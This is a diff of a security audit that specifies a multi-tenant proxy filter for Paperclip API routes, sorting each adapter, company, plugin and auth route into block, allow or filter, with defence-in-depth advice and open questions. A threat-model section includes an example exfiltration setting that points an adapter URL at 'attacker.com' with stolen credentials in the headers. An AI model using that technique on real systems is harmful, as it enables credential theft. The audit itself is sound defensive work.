@@ -1,4 +1,4 @@
-# Paperclip Adapter-Surface Route Audit (Isol8 Proxy Filter Spec)
+# Paperclip Adapter-Surface Route Audit (Lightbulb AI Proxy Filter Spec)
 
 **Audit date:** 2026-05-02
 **Source tree:** `/Users/prasiddhaparthsarthy/Desktop/isol8.nosync/paperclip/` (read-only reference)
@@ -48,15 +48,15 @@
 
 Every Paperclip API route that creates/updates/lists/configures adapters or agents/hires/configs that carry `adapterType`. Routes that obviously have no adapter surface are summarized at the bottom.
 
-> **Path notation.** All Paperclip routes shown below are mounted under `/api`. The Isol8 proxy will see them with whatever prefix it adds on top of that. Where Paperclip's own router file uses bare `/<thing>` (e.g. `companyRoutes` is mounted at `/api/companies`), I show the full `/api/...` path the proxy will see.
+> **Path notation.** All Paperclip routes shown below are mounted under `/api`. The Lightbulb AI proxy will see them with whatever prefix it adds on top of that. Where Paperclip's own router file uses bare `/<thing>` (e.g. `companyRoutes` is mounted at `/api/companies`), I show the full `/api/...` path the proxy will see.
 
 ### 2.1 Adapter management surface — `routes/adapters.ts`
 
-These are the most directly dangerous routes. All run as `assertInstanceAdmin` on Paperclip's side, but **we do not trust that gate** in the shared multi-tenant deployment: the `req.actor.isInstanceAdmin` flag depends on Paperclip's own user identity, and the Isol8 proxy forwards a service-account cookie, not a tenant identity. Any tenant whose proxied requests come back as "instance admin" gets the lot.
+These are the most directly dangerous routes. All run as `assertInstanceAdmin` on Paperclip's side, but **we do not trust that gate** in the shared multi-tenant deployment: the `req.actor.isInstanceAdmin` flag depends on Paperclip's own user identity, and the Lightbulb AI proxy forwards a service-account cookie, not a tenant identity. Any tenant whose proxied requests come back as "instance admin" gets the lot.
 
 | Method | Path | Body fields of interest | What it does | Disposition | Notes |
 |---|---|---|---|---|---|
-| GET | `/api/adapters` | — | Lists every registered server adapter (builtin + external) with capabilities & versions. | **FILTER_RESPONSE** | Response is a JSON array of `AdapterInfo`. Strip every entry whose `type !== "openclaw_gateway"`. Reason: tenants will ask the UI for adapter list to populate dropdowns; we still want them to see the gateway. Alternative: BLOCK — the Isol8 frontend should not be using this list anyway because we own the agent-create surface. Recommend BLOCK unless the proxy is also fronting the Paperclip UI for our users. |
+| GET | `/api/adapters` | — | Lists every registered server adapter (builtin + external) with capabilities & versions. | **FILTER_RESPONSE** | Response is a JSON array of `AdapterInfo`. Strip every entry whose `type !== "openclaw_gateway"`. Reason: tenants will ask the UI for adapter list to populate dropdowns; we still want them to see the gateway. Alternative: BLOCK — the Lightbulb AI frontend should not be using this list anyway because we own the agent-create surface. Recommend BLOCK unless the proxy is also fronting the Paperclip UI for our users. |
 | POST | `/api/adapters/install` | `packageName: string`, `version?: string`, `isLocalPath?: boolean` | Runs `npm install <packageName>` (or `npm install <localPath>`) on the Paperclip host, then registers the loaded module. | **BLOCK** | Pre-`npm-install` validation happens after the install. Even passing `packageName: ""` triggers no-op `npm install` in the plugin dir but not before timing out. We do not want tenants reaching this. |
 | PATCH | `/api/adapters/:type` | `disabled: boolean` | Toggle disabled-set entry — affects `listEnabledServerAdapters()` only. Does not delete. | **BLOCK** | We control the disabled set out-of-band (see §4). |
 | PATCH | `/api/adapters/:type/override` | `paused: boolean` | Pause/resume an external override of a builtin type. | **BLOCK** | Mutates global server state (`pausedOverrides` set in `adapters/registry.ts:359`). |
@@ -121,10 +121,10 @@ These are the most directly dangerous routes. All run as `assertInstanceAdmin` o
 | POST | `/api/companies/import/preview` | Same shape | Preview without applying. Does *not* mutate. | **FILTER_REQUEST** | Apply the same filter — preview is also a leak surface (it'll tell the tenant "your bundle was accepted/rejected" plus diff details). Conservative: BLOCK same as import. |
 | POST | `/api/companies/:companyId/exports`, `/exports/preview`, `/:companyId/export` | — | Export a company bundle. Output contains adapterType per agent. Read-only on the company side. | **FILTER_RESPONSE** or BLOCK | Only worth filtering if our tenants can be tricked into running an exported bundle elsewhere — out of scope for the proxy. Recommend BLOCK to keep the surface small. |
 | POST | `/api/companies/:companyId/imports/preview`, `/api/companies/:companyId/imports/apply` | Same as global import | Per-company variant ("agent_safe" mode) of import. Has additional constraints — collision strategy can't be `replace`, target must match — but **does not strip non-allowlisted adapter types.** | **FILTER_REQUEST** | Same JSON path filter as `/api/companies/import`. |
-| POST | `/api/companies/` | `name`, `budgetMonthlyCents`, etc. | Create a company. Only instance-admin can call. No adapter fields. | **BLOCK** | Multi-tenant: tenants must not create companies; we provision them via Isol8. |
+| POST | `/api/companies/` | `name`, `budgetMonthlyCents`, etc. | Create a company. Only instance-admin can call. No adapter fields. | **BLOCK** | Multi-tenant: tenants must not create companies; we provision them via Lightbulb AI. |
 | PATCH | `/api/companies/:companyId`, `/branding` | `name`, branding fields | Update company. No adapter fields. | ALLOW | — |
 | POST | `/api/companies/:companyId/archive` | — | Archive company. | ALLOW | — |
-| DELETE | `/api/companies/:companyId` | — | Delete company. | **BLOCK** | Same reasoning as create — Isol8 owns lifecycle. |
+| DELETE | `/api/companies/:companyId` | — | Delete company. | **BLOCK** | Same reasoning as create — Lightbulb AI owns lifecycle. |
 | GET | `/api/companies`, `/stats`, `/:companyId`, `/:companyId/feedback-traces` | — | Read-only. | ALLOW | — |
 
 ### 2.5 Invites + join requests — `routes/access.ts`
@@ -159,7 +159,7 @@ These don't touch `adapterType` directly. **However:** plugins can declare `envi
 | POST | `/api/plugins/:pluginId/webhooks/:endpointKey` | arbitrary | Plugin-defined webhook. | **BLOCK** | — |
 | POST | `/api/plugins/:pluginId/{bridge/data,bridge/action,data/:key,actions/:key}` | arbitrary | Send data/action to plugin worker. | **BLOCK** | — |
 | GET | `/api/plugins/:pluginId/bridge/stream/:channel` | — | SSE stream from plugin. | **BLOCK** | — |
-| POST | `/api/plugins/tools/execute` | `tool`, `parameters`, `runContext` | Invoke a plugin-contributed tool. Has `assertCompanyAccess(req, runContext.companyId)`. | **BLOCK** | Out-of-scope for adapter filter, but tenant access to arbitrary plugin tools is a separate compromise vector — block by default and unblock case-by-case if Isol8 ever ships a vetted plugin. |
+| POST | `/api/plugins/tools/execute` | `tool`, `parameters`, `runContext` | Invoke a plugin-contributed tool. Has `assertCompanyAccess(req, runContext.companyId)`. | **BLOCK** | Out-of-scope for adapter filter, but tenant access to arbitrary plugin tools is a separate compromise vector — block by default and unblock case-by-case if Lightbulb AI ever ships a vetted plugin. |
 | GET | `/api/plugins`, `/api/plugins/examples`, `/api/plugins/ui-contributions`, `/api/plugins/tools`, `/api/plugins/:pluginId`, `/api/plugins/:pluginId/health`, `/api/plugins/:pluginId/logs`, `/api/plugins/:pluginId/jobs`, `/api/plugins/:pluginId/jobs/:jobId/runs`, `/api/plugins/:pluginId/dashboard`, `/api/plugins/:pluginId/config` | — | Read-only. | **BLOCK** | Information-disclosure about plugins available on the shared host. Tenants don't need plugin metadata; we own the surface. |
 
 ### 2.7 Environments — `routes/environments.ts`
@@ -208,7 +208,7 @@ The big gotcha here is `issueAssigneeAdapterOverridesSchema` (`packages/shared/s
 
 | Method | Path | Body fields | What it does | Disposition | Notes |
 |---|---|---|---|---|---|
-| `*` | `/api/auth/{*authPath}` | — | better-auth handler — sessions, sign-in, etc. Gated by `betterAuthHandler` if provided. | **BLOCK** | Tenants must not interact with Paperclip's own auth — Isol8 forwards a service-account cookie. |
+| `*` | `/api/auth/{*authPath}` | — | better-auth handler — sessions, sign-in, etc. Gated by `betterAuthHandler` if provided. | **BLOCK** | Tenants must not interact with Paperclip's own auth — Lightbulb AI forwards a service-account cookie. |
 | GET | `/api/auth/get-session`, `/api/auth/profile` | — | Session/profile read. | **BLOCK** | Same reason. |
 | PATCH | `/api/auth/profile` | `name`, `image` | Update Paperclip user profile. | **BLOCK** | Mutates the shared service account. |
 
@@ -254,7 +254,7 @@ What this means concretely:
 - Tenant sets `adapterConfig.url = "wss://attacker.com/exfil?token=..."` and shoves Aurora creds into the headers via `adapterConfig.headers`. Paperclip will dutifully send custom headers (`packages/adapters/openclaw-gateway/src/server/test.ts:102 — headers passed to WebSocket()`).
 
 **Defence-in-depth options the proxy author should layer:**
-1. Inspect `$.adapterConfig.url` (and `$.adapterConfig.headers`) on every FILTER_REQUEST listed above and refuse non-Isol8 URLs. Allowlist: `wss://gateway-{tenantId}.openclaw.isol8.internal/` or whatever the per-tenant gateway hostname pattern is.
+1. Inspect `$.adapterConfig.url` (and `$.adapterConfig.headers`) on every FILTER_REQUEST listed above and refuse non-Lightbulb AI URLs. Allowlist: `wss://gateway-{tenantId}.openclaw.isol8.internal/` or whatever the per-tenant gateway hostname pattern is.
 2. Network-level: Paperclip's egress security group should disallow RFC1918, IMDS, and 0.0.0.0/0 except per-tenant gateway ranges.
 3. Log all probe URLs — they're trivially abused.
 
@@ -353,11 +353,11 @@ Write `[]` (empty array) at provisioning time to ensure no pre-installed externa
 
 These are items the proxy filter author should clarify before merging the filter PR — answered "yes" or "no", they don't block the spec, but they change the disposition of specific routes.
 
-1. **Q: Does the Isol8 proxy ever forward a request as `req.actor.isInstanceAdmin = true`?**
-   File to check: `paperclip/server/src/middleware/auth.ts` (the `actorMiddleware` factory) and however Isol8 forwards its service-account cookie.
+1. **Q: Does the Lightbulb AI proxy ever forward a request as `req.actor.isInstanceAdmin = true`?**
+   File to check: `paperclip/server/src/middleware/auth.ts` (the `actorMiddleware` factory) and however Lightbulb AI forwards its service-account cookie.
    Why it matters: every `assertInstanceAdmin` route (the entire `/api/adapters/*` write surface) trusts that flag. If the answer is yes, those BLOCK dispositions are mandatory; if the answer is no, they're already 403 from Paperclip and we can simplify to ALLOW (but defence-in-depth says still BLOCK).
 
-2. **Q: Does the Isol8 proxy ever inject a tenant-scoped `companyIds` array, or always forward as a single board-style identity?**
+2. **Q: Does the Lightbulb AI proxy ever inject a tenant-scoped `companyIds` array, or always forward as a single board-style identity?**
    File to check: same — `actorMiddleware` and the better-auth bridge. Specifically `routes/authz.ts:42-64` (`assertCompanyAccess`).
    Why it matters: GET `/api/companies` filters on `req.actor.companyIds`. If the proxy forwards a single identity that has access to *every* tenant's company, the filter doesn't help — we need to do tenant-scoping at the proxy.
 
@@ -370,7 +370,7 @@ These are items the proxy filter author should clarify before merging the filter
    Why it matters: if it's unauthenticated, the FILTER_REQUEST is straightforward. If our proxy somehow wraps it in a tenant identity, the filter still works but the threat surface is different.
 
 5. **Q: Does `routine-triggers/public/:publicId/fire` (`routes/routines.ts:306`) traverse the proxy at all, or does it bypass?**
-   File to check: Isol8 proxy routing config.
+   File to check: Lightbulb AI proxy routing config.
    Why it matters: it's unauthenticated. If it traverses the proxy, we should still inspect to make sure no body fields can change adapter behaviour. (After review: the body is just signed/HMAC payload data, not adapter config — ALLOW is correct.)
 
 6. **Q: Are `/api/auth/{*authPath}` routes ever expected to be tenant-reachable?**
@@ -378,16 +378,16 @@ These are items the proxy filter author should clarify before merging the filter
    Why it matters: I marked it BLOCK. Confirm tenants never sign in to Paperclip's own auth surface.
 
 7. **Q: What does `req.actor.companyIds` contain when our service-account-cookie traverses Paperclip?**
-   File to check: `routes/authz.ts:42-64` and however Isol8 mints the cookie.
+   File to check: `routes/authz.ts:42-64` and however Lightbulb AI mints the cookie.
    Why it matters: if it's `null` / `undefined`, `assertBoardOrgAccess` (`authz.ts:26-32`) will throw because of `Array.isArray(req.actor.companyIds) && req.actor.companyIds.length > 0`. Many ALLOW routes use this — if it consistently throws, the proxy will see a lot of 403s where we expect 200s.
 
-8. **Q: Is the project-workspace `cleanupCommand` patch already filtered by Isol8's surface, or does it traverse the proxy?**
-   File to check: Isol8 proxy + `routes/projects.ts` `PATCH /:id/workspaces/:workspaceId`.
+8. **Q: Is the project-workspace `cleanupCommand` patch already filtered by Lightbulb AI's surface, or does it traverse the proxy?**
+   File to check: Lightbulb AI proxy + `routes/projects.ts` `PATCH /:id/workspaces/:workspaceId`.
    Why it matters: §3.5 — that's a quiet command-execution surface the adapter filter won't catch.
 
 9. **Q: Does the openclaw_gateway adapter's `execute()` actually need the `headers` field in `adapterConfig` to be tenant-controlled?**
-   File to check: `apps/backend/...` Isol8 backend code that constructs gateway-agent payloads when provisioning, and `packages/adapters/openclaw-gateway/src/server/execute.ts:235-246`.
-   Why it matters: if Isol8 backend always sets `adapterConfig.headers` server-side and the tenant never needs to specify them, the proxy can strip the field on every FILTER_REQUEST and close §3.2. If tenants need it, we have to allowlist values.
+   File to check: `apps/backend/...` Lightbulb AI backend code that constructs gateway-agent payloads when provisioning, and `packages/adapters/openclaw-gateway/src/server/execute.ts:235-246`.
+   Why it matters: if Lightbulb AI backend always sets `adapterConfig.headers` server-side and the tenant never needs to specify them, the proxy can strip the field on every FILTER_REQUEST and close §3.2. If tenants need it, we have to allowlist values.
 
 ---
 
